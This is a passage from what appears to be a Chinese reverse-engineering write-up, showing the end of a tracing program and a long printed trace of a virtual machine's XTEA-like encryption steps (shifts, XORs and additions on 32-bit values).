	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>最后运行输出得到一个vm加密流程</p>
<p>以下是部分输出内容。</p>
<p>output:</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">4</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">8</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">32323232</span> <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">1919191</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">32323232</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> c8c8c8c80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1919191</span> <span class="token operator">^</span> <span class="token number">8</span>c8c8c80 <span class="token operator">=</span> <span class="token number">8</span>d1d1d11
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">32323232</span> <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">23100176</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8</span>d1d1d11 <span class="token operator">+</span> <span class="token number">23100176</span> <span class="token operator">=</span> b02d1e87
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">776f</span>6853
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> dcc47a41
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> b02d1e87 <span class="token operator">^</span> dcc47a41 <span class="token operator">=</span> <span class="token number">6</span>ce964c6
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6</span>ce964c6 <span class="token operator">+</span> <span class="token number">31313131</span> <span class="token operator">=</span> <span class="token number">9e1</span>a95f7
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f7 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">9e1</span>a95f
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f7 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">4f</span>0d4afb80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f <span class="token operator">^</span> d4afb80 <span class="token operator">=</span> <span class="token number">4</span>ab52df
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f7 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> cb7ce27f
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span>ab52df <span class="token operator">+</span> cb7ce27f <span class="token operator">=</span> d028355e
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">>></span> b <span class="token operator">=</span> bebfc
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bebfc <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">=</span> d6cf4f3a
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> d6cf4f3a <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> f5ec1a5c
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f5ec1a5c <span class="token operator">^</span> d028355e <span class="token operator">=</span> <span class="token number">25</span>c42f02
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">25</span>c42f02 <span class="token operator">+</span> <span class="token number">32323232</span> <span class="token operator">=</span> <span class="token number">57f</span>66134
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">57f</span>66134 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">2</span>bfb309
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">57f</span>66134 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">15f</span>d984d00
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">2</span>bfb309 <span class="token operator">^</span> fd984d00 <span class="token operator">=</span> ff27fe09
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">57f</span>66134 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">46</span>d45270
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> ff27fe09 <span class="token operator">+</span> <span class="token number">46</span>d45270 <span class="token operator">=</span> <span class="token number">145f</span>c5079
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">3</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">74696564</span> <span class="token operator">+</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">=</span> d3c94c4b
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> d3c94c4b <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">78625e59</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">45f</span>c5079 <span class="token operator">^</span> <span class="token number">78625e59</span> <span class="token operator">=</span> <span class="token number">3</span>d9e0e20
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>d9e0e20 <span class="token operator">+</span> <span class="token number">9e1</span>a95f7 <span class="token operator">=</span> dbb8a417
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> dbb8a417 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> dbb8a41
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> dbb8a417 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">6</span>ddc520b80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> dbb8a41 <span class="token operator">^</span> dc520b80 <span class="token operator">=</span> d1e981c1
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> dbb8a417 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">8</span>eded39f
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d1e981c1 <span class="token operator">+</span> <span class="token number">8</span>eded39f <span class="token operator">=</span> <span class="token number">160</span>c85560
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> bebfcdce <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">17</span>d7f9
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17</span>d7f9 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> bebfcdce <span class="token operator">=</span> <span class="token number">1242</span>b2f3b
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">242</span>b2f3b <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">7087</span>a5d
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7087</span>a5d <span class="token operator">^</span> <span class="token number">60</span>c85560 <span class="token operator">=</span> <span class="token number">67</span>c02f3d
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>c02f3d <span class="token operator">+</span> <span class="token number">57f</span>66134 <span class="token operator">=</span> bfb69071
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfb69071 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">5f</span>db483
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfb69071 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">2f</span>eda41c40
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5f</span>db483 <span class="token operator">^</span> eda41c40 <span class="token operator">=</span> e859a8c3
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bfb69071 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> ae94a335
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e859a8c3 <span class="token operator">+</span> ae94a335 <span class="token operator">=</span> <span class="token number">196</span>ee4bf8
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bebfcdce <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> bebfcdce <span class="token operator">=</span> <span class="token number">1202</span>d2d40
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">202</span>d2d40 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">8</span>b863f52
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">96</span>ee4bf8 <span class="token operator">^</span> <span class="token number">8</span>b863f52 <span class="token operator">=</span> <span class="token number">1</span>d6874aa
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span>d6874aa <span class="token operator">+</span> dbb8a417 <span class="token operator">=</span> f92118c1
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> f92118c1 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> f92118c
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f92118c1 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">7</span>c908c6080
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f92118c <span class="token operator">^</span> <span class="token number">908</span>c6080 <span class="token operator">=</span> <span class="token number">9f</span>1e710c
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f92118c1 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> ac476f49
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9f</span>1e710c <span class="token operator">+</span> ac476f49 <span class="token operator">=</span> <span class="token number">14</span>b65e055
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">3</span>c3f6
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>c3f6 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">=</span> <span class="token number">7f</span>8d1427
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7f</span>8d1427 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">5</span>cae4141
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5</span>cae4141 <span class="token operator">^</span> <span class="token number">4</span>b65e055 <span class="token operator">=</span> <span class="token number">17</span>cba114
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17</span>cba114 <span class="token operator">+</span> bfb69071 <span class="token operator">=</span> d7823185
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> d7823185 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">6</span>bc118c
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d7823185 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">35e08</span>c6140
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6</span>bc118c <span class="token operator">^</span> e08c6140 <span class="token operator">=</span> e63070cc
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> d7823185 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> c6a002c1
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e63070cc <span class="token operator">+</span> c6a002c1 <span class="token operator">=</span> <span class="token number">1</span>acd0738d
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">=</span> <span class="token number">838</span>b1622
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">838</span>b1622 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">28200430</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> acd0738d <span class="token operator">^</span> <span class="token number">28200430</span> <span class="token operator">=</span> <span class="token number">84f</span>077bd
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">84f</span>077bd <span class="token operator">+</span> f92118c1 <span class="token operator">=</span> <span class="token number">17e11907</span>e
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span>e <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">7e11907</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span>e <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">3f</span>08c83f00
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span> <span class="token operator">^</span> <span class="token number">8</span>c83f00 <span class="token operator">=</span> f292607
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span>e <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">2</span>b77e7f6
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f292607 <span class="token operator">+</span> <span class="token number">2</span>b77e7f6 <span class="token operator">=</span> <span class="token number">3</span>aa10dfd
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7</span>d7f9b9c <span class="token operator">>></span> b <span class="token operator">=</span> faff3
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> faff3 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">3</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">74696564</span> <span class="token operator">+</span> <span class="token number">7</span>d7f9b9c <span class="token operator">=</span> f1e90100
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f1e90100 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> d2ca5466
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d2ca5466 <span class="token operator">^</span> <span class="token number">3</span>aa10dfd <span class="token operator">=</span> e86b599b
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e86b599b <span class="token operator">+</span> d7823185 <span class="token operator">=</span> <span class="token number">1</span>bfed8b20
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfed8b20 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">5ff</span>6c59
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfed8b20 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">2ff</span>b62c800
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5ff</span>6c59 <span class="token operator">^</span> fb62c800 <span class="token operator">=</span> fe9da459
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bfed8b20 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> aecfb864
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> fe9da459 <span class="token operator">+</span> aecfb864 <span class="token operator">=</span> <span class="token number">1</span>ad6d5cbd
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7</span>d7f9b9c <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> <span class="token number">7</span>d7f9b9c <span class="token operator">=</span> f4ef03ef
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f4ef03ef <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">5f</span>4411fd
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> ad6d5cbd <span class="token operator">^</span> <span class="token number">5f</span>4411fd <span class="token operator">=</span> f2294d40
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f2294d40 <span class="token operator">+</span> <span class="token number">7e11907</span>e <span class="token operator">=</span> <span class="token number">1703</span>addbe
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addbe <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">703</span>addb
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addbe <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">381</span>d6edf00
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addb <span class="token operator">^</span> <span class="token number">1</span>d6edf00 <span class="token operator">=</span> <span class="token number">1</span>a6d72db
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addbe <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">255</span>caa36
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span>a6d72db <span class="token operator">+</span> <span class="token number">255</span>caa36 <span class="token operator">=</span> <span class="token number">3f</span>ca1d11
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> dcdf8283 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">1</span>b9bf0
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span>b9bf0 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> dcdf8283 <span class="token operator">=</span> <span class="token number">1544</span>eead6
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">544</span>eead6 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">776</span>dbfb0
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776</span>dbfb0 <span class="token operator">^</span> <span class="token number">3f</span>ca1d11 <span class="token operator">=</span> <span class="token number">48</span>a7a2a1
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">48</span>a7a2a1 <span class="token operator">+</span> bfed8b20 <span class="token operator">=</span> <span class="token number">108952</span>dc1
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8952</span>dc1 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">44</span>a96e
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8952</span>dc1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">2254</span>b7040
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">44</span>a96e <span class="token operator">^</span> <span class="token number">254</span>b7040 <span class="token operator">=</span> <span class="token number">250f</span>d92e
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8952</span>dc1 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">19</span>b71e85
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">250f</span>d92e <span class="token operator">+</span> <span class="token number">19</span>b71e85 <span class="token operator">=</span> <span class="token number">3</span>ec6f7b3
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> dcdf8283 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">3</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">74696564</span> <span class="token operator">+</span> dcdf8283 <span class="token operator">=</span> <span class="token number">15148e7</span>e7
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5148e7</span>e7 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> fae3f5f5
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>ec6f7b3 <span class="token operator">^</span> fae3f5f5 <span class="token operator">=</span> c4250246
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> c4250246 <span class="token operator">+</span> <span class="token number">703</span>addbe <span class="token operator">=</span> <span class="token number">1345f</span>e004
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e004 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">345f</span>e00
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e004 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">1</span>a2ff00200
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e00 <span class="token operator">^</span> <span class="token number">2ff</span>00200 <span class="token operator">=</span> <span class="token number">2</span>cb5fc00
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e004 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">6139978</span>c
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">2</span>cb5fc00 <span class="token operator">+</span> <span class="token number">6139978</span>c <span class="token operator">=</span> <span class="token number">8</span>def938c
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>c3f696a <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">787</span>ed
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">787</span>ed <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> <span class="token number">3</span>c3f696a <span class="token operator">=</span> a1aacad7
